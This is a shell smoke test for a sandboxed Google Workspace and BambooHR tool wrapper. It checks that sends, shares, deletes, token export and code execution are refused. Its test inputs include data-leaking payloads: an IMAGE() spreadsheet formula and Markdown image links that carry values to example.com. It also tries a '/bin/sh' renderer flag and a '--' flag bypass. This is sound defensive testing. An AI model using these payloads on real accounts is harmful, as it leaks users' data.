#!/bin/sh
# Offline checks of the built marsh-tools Kit image (no credentials, no network
# calls succeed). Usage: tests/kits/tools-smoke.sh IMAGE
set -eu
image=$1
gog() { docker run --rm --network none -e GOG_ENABLE_COMMANDS_EXACT=gmail.send "$image" gog "$@" 2>&1 || true; }
fail() { echo "FAIL: $*" >&2; exit 1; }

docker run --rm --entrypoint /usr/local/libexec/gog "$image" --version | grep -q . || fail "gog binary"

# Every REFUSE category of the policy (kits/marsh-tools/README.md) is refused
# before any request: sends and notifications, sharing, deletes, account
# settings, admin and auth, code execution, hooks and passthroughs, publishing
# local files, and calendar changes.
for cmd in "gmail send --to a@b.c --subject s --body b" "send --to a@b.c --subject s --body b" \
           "gmail drafts send d1" "gmail drafts post d1" "gmail reply m1 --body b" "gmail forward m1 --to a@b.c" \
           "gmail reply-all m1 --body b" "gmail autoreply from:x --body b" "chat messages send s1 --text hi" \
           "calendar respond primary e1 --status accepted" "calendar out-of-office --from 2026-01-01T09:00:00Z --to 2026-01-02T09:00:00Z" \
           "calendar create primary --summary s --from 2026-01-01T09:00:00Z --to 2026-01-01T10:00:00Z" "calendar update primary e1 --summary s" \
           "calendar working-location --from 2026-01-01 --to 2026-01-02 --type home" "calendar propose-time cal e1" \
           "drive share f1 --email a@b.c" "drive unshare f1 p1" "drive bulk remove-public --file f1" "drive comments create f1 hi" \
           "drive delete f1" "gmail trash m1" "gmail batch delete m1" "calendar delete primary e1" "tasks delete l1 t1" "keep delete n1" \
           "docs delete-tab d1 --tab t1" "docs clear d1" "sheets delete-tab s1 Tab" "sheets clear s1 A1:B2" "sheets batch-request s1 --requests-json []" \
           "slides delete-slide p1 s1" "drive move f1 --parent p1" "drive sync push ./d --parent p1" "drive shortcut create f1 --parent p1" "forms publish f1" \
           "slides create-from-markdown x.md" "docs sed d1 s/a/b/" "sheets find-replace s1 a b" \
           "gmail settings filters create --from a@b.c --trash" "gmail filters create --from a@b.c --trash" "gmail settings forwarding create a@b.c" \
           "gmail settings delegates add a@b.c" "gmail settings sendas update a@b.c" "gmail settings vacation update --enable" \
           "auth list" "auth tokens export a@b.c" "login a@b.c" "config set x y" "admin users list" "backup push" "batch end b1" \
           "api call drive v3 files.list" "mcp" "update status" "zoom auth setup" "classroom announcements create c1 --text hi" \
           "contacts delete c1" "docs insert-image d1 --url https://example.com/a.png" "slides insert-image p1 ./x.png" "docs comments poll d1 --state-file s.json --on-new true"; do
  gog $cmd | grep -qE "is not enabled|is not available" || fail "not refused: $cmd"
done

# A sample of every ALLOW category gets past the allowlist and the wrapper's
# rules (and then fails only on the network or its own arguments).
for cmd in "gmail search newer_than:1d --max 1" "gmail drafts create --to a@b.c --subject s --body b" "gmail settings filters list" \
           "calendar events --max 1" "drive ls" "drive upload ./x" "drive mkdir d" "drive rename f1 n" \
           "docs create t" "docs write d1 --text x" "docs write d1 --markdown --append --text [link](https://example.com)" \
           "docs tabs rename d1 --tab t --title n" "docs add-tab d1 --title t" "docs rename-tab d1 --tab t --title n" \
           "sheets create t" "sheets update s1 A1 x" "sheets append s1 A1 x" "sheets add-tab s1 Tab" "sheets rename-tab s1 Old New" "sheets duplicate-tab s1 Tab New" \
           "slides create t" "slides replace-text p1 a b --all" "forms create --title t" "forms questions add f1 --title t" \
           "tasks add l1 --title t" "tasks done l1 t1" "tasks lists create t" "people me" "time now" "ls" "search x" "upload ./x" \
           "drive search x --parent f1" "tasks add l1 --title t --parent t1"; do
  out=$(gog $cmd)
  echo "$out" | grep -qE "is not enabled|is not available|image markup|is fixed to" && fail "allowed command refused: $cmd: $out"
done

# Nothing runs code: --mmdc (an external renderer) is refused wherever it appears.
gog slides create-from-markdown x.md --mmdc /bin/sh | grep -q "is not available" || fail "--mmdc accepted"
gog docs cat d1 --on-new true | grep -qE "is not available|unknown flag" || fail "--on-new accepted"

# New files land in My Drive root: no destination, however the command is spelled.
# A copy is pinned to the root so it can't inherit its source's (maybe shared) folder.
for cmd in "drive upload ./x --parent f1" "upload ./x --parent=f1" "drive mkdir d --parent f1" "docs create t --parent f1" \
           "sheets create t --parent f1" "drive upload ./x --convert-to sheet" "upload ./x --convert" "docs insert d1 x -f ./x"; do
  gog $cmd | grep -q "is not available" || fail "destination or conversion accepted: $cmd"
done
for cmd in "drive copy f1 n --parent p1" "docs copy d1 t --parent f1" "sheets copy s1 t --parent f1" "slides copy p1 t --parent f1" \
           "slides create t --parent f1" "slides create-from-template t1 t --parent f1"; do
  gog $cmd | grep -q "is fixed to root" || fail "copy destination accepted: $cmd"
done
for cmd in "drive copy f1 n" "docs copy d1 t" "sheets copy s1 t" "slides copy p1 t" "slides create t" "slides create t --template p1"; do
  gog -n --json $cmd | grep -q '"parent": "root"' || fail "copy isn't pinned to the root: $cmd"
done

# Sheets values are stored as typed: formulas such as IMAGE() are never evaluated.
for cmd in "sheets append s1 A1 x --input USER_ENTERED" "sheets update s1 A1 x --input=USER_ENTERED" \
           "sheets table append s1 t1 x --input=USER_ENTERED" "sheets batch-update s1 --data-json [] --input=USER_ENTERED"; do
  gog $cmd | grep -q "is fixed to RAW" || fail "USER_ENTERED accepted: $cmd"
done
for cmd in "sheets append s1 A1 x" "sheets update s1 A1 x" "sheets append s1 A1 x --input RAW"; do
  gog -n --json $cmd | grep -q '"value_input_option": "RAW"' || fail "sheet write isn't RAW: $cmd"
done
gog -n --json sheets append s1 A1 '=IMAGE("https://example.com/?q="&A1)' | grep -q '"value_input_option": "RAW"' || fail "formula not stored as typed"

# Docs content has no image markup, which Google would fetch from any URL.
work=$(mktemp -d)
trap 'rm -rf "$work"' EXIT
printf 'hello ![x](https://example.com/?q=secret)\n' > "$work/image.md"
printf '# Plain\n\nno images, a [link](https://example.com)\n' > "$work/plain.md"
gogv() { docker run --rm --network none -v "$work:/work" -w /work "$image" gog "$@" 2>&1 || true; }
for cmd in "docs write d1 --markdown --append --text hi![x](https://example.com/a.png)" "docs insert d1 <IMG_src=https://example.com/a.png>" \
           "docs write d1 --markdown --append --file image.md" "docs write d1 --markdown --append --file=image.md" \
           "docs create t --file image.md" "docs update d1 --markdown --file image.md" "docs find-replace d1 a --content-file image.md --format markdown"; do
  gogv $cmd | grep -q "image markup" || fail "image markup accepted: $cmd"
done
echo 'a ![x](https://example.com/a.png)' | docker run --rm -i --network none "$image" gog docs insert d1 --markdown --file - 2>&1 \
  | grep -q "image markup" || fail "image markup accepted on stdin"
for cmd in "docs write d1 --markdown --append --file plain.md" "docs create t --file plain.md"; do
  gogv -n $cmd | grep -q "Dry run" || fail "plain Markdown refused: $cmd"
done
gogv docs write d1 --text hello | grep -qE "image markup|is not (enabled|available)" && fail "plain doc write refused"

# Drafts are plain text, which Gmail never fetches anything for.
printf '<b>x</b>' > "$work/x.html"
printf 'Subject: s\n\nx\n' > "$work/x.eml"
for cmd in "gmail drafts create --to a@b.c --subject s --body-html <b>x</b>" "gmail drafts update d1 --subject s --body-html-file x.html" \
           "gmail drafts create --raw-file x.eml"; do
  gogv $cmd | grep -q "is not available" || fail "HTML draft accepted: $cmd"
done

# Every command gog has is allowed or refused, nothing in both, and every flag
# rule is real and enforced.
"$(dirname "$0")/tools-policy.py" "$image" || fail "policy lists out of step with gog"

# The wrapper's own flags can't be overridden.
for flag in --enable-commands-exact=gmail.send --enable-commands=gmail --disable-commands=x \
            --access-token=x --home=/tmp --client=x --readonly=false --gmail-no-send=false; do
  gog "$flag" gmail send --to a@b.c | grep -q "fixed by this tool" || fail "flag accepted: $flag"
done

# Without its list or its rules the wrapper refuses to run (an empty list would allow everything).
docker run --rm --network none --user root --entrypoint sh "$image" -c \
  'rm /usr/local/share/gog-allowed-commands; /usr/local/bin/marsh-tools gog gmail search x' 2>&1 | grep -q "list is missing" || fail "runs without allowlist"
docker run --rm --network none --user root --entrypoint sh "$image" -c \
  'rm /usr/local/share/gog-flag-rules; /usr/local/bin/marsh-tools gog gmail search x' 2>&1 | grep -q "rules are missing" || fail "runs without flag rules"

# The wrapper doesn't take "--" (arguments after it would skip the flag rules).
gog drive upload ./x -- --parent f1 | grep -q "not supported" || fail "-- accepted"

# Proxy settings survive the wrapper: SBX attaches the credential at its proxy.
docker run --rm --network none -e HTTPS_PROXY=http://127.0.0.1:9 "$image" gog gmail search x 2>&1 \
  | grep -qi "proxy" || fail "gog ignored the proxy settings"

# bamboohr: only directory reads exist, and the company comes from the image.
docker run --rm --network none "$image" bamboohr update-employee 2>&1 | grep -q "operation is not allowed" || fail "bamboohr write op"
docker run --rm --network none "$image" bamboohr find-employee --query x 2>&1 | grep -q "BAMBOOHR_COMPANY_DOMAIN" || fail "bamboohr without a company"

# The tool comes from marsh's job record; an unknown name is refused.
job() { printf '{"version":1,"job":"j","name":"%s"}' "$1"; }
docker run --rm --network none --user root --entrypoint sh "$image" -c \
  "mkdir -p /run/marsh && echo '$(job bamboohr)' > /run/marsh/job.json && /usr/local/bin/marsh-tools update-employee" 2>&1 \
  | grep -q "operation is not allowed" || fail "job name did not pick bamboohr"
docker run --rm --network none --user root --entrypoint sh "$image" -c \
  "mkdir -p /run/marsh && echo '$(job other)' > /run/marsh/job.json && /usr/local/bin/marsh-tools gmail search x" 2>&1 \
  | grep -q "register this Kit under one of" || fail "unknown tool name accepted"
echo "smoke: ok"
